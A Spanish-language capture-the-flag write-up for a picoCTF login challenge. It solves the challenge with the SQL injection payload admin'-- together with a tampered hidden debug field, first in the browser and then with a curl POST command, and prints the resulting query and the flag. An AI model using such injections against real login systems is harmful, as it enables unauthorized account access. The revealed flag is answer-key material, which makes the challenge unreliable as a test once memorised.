
## Descripción
Do you think you can log us in? Try to see if you can login!

[http://fickle-tempest.picoctf.net:56657](http://fickle-tempest.picoctf.net:56657/).
1.- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

2.- Try to think about how the website verifies your login.
## Solución
Solución 1
```
Entramos a la página y abrimos el formulario de login desde `Admin Login`.
Después inspeccionamos el código del formulario y encontramos el siguiente campo oculto:
<inpt type="hidden" name="debug" value="0">

Modificamos el valor de `debug` de `0` a `1` desde el inspector del navegador:

<inpt type="hidden" name="debug" value="1">

Luego colocamos el siguiente usuario:

admin'--

Y en la contraseña podemos escribir cualquier cosa:

a

Al iniciar sesión, la página muestra la consulta SQL:

sql
SELECT * FROM users WHERE name='admin'--' AND password='a'

El `--` comenta la parte de la contraseña, por lo que la consulta valida solamente al usuario `admin`.

Resultado:
Logged in!
Your flag is: picoCTF{s0m3_SQL_85832275}
```
Solución 2 Desde Kali se puede hacer el mismo ataque enviando los datos por POST con `curl -s`.
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://fickle-tempest.picoctf.net:56657/login.html
<form action="login.php" method="POST">
    <input type="text" id="username" name="username" class="form-control">
    <input type="password" id="password" name="password" class="form-control">
    <input type="hidden" name="debug" value="0">
</form>


┌──(kali㉿kali)-[~]
└─$ curl -s -X POST -d "username=admin'--&password=a&debug=1" http://fickle-tempest.picoctf.net:56657/login.php
<pre>username: admin'--
password: a
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='a'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>

picoCTF{s0m3_SQL_85832275}
```
## Notas Adicionales
- La vulnerabilidad es una inyección SQL en el campo `username`.
## Referencias
- [http://fickle-tempest.picoctf.net:56657/](http://fickle-tempest.picoctf.net:56657/)
- [http://fickle-tempest.picoctf.net:56657/login.html](http://fickle-tempest.picoctf.net:56657/login.html)
- [http://fickle-tempest.picoctf.net:56657/login.php](http://fickle-tempest.picoctf.net:56657/login.php)
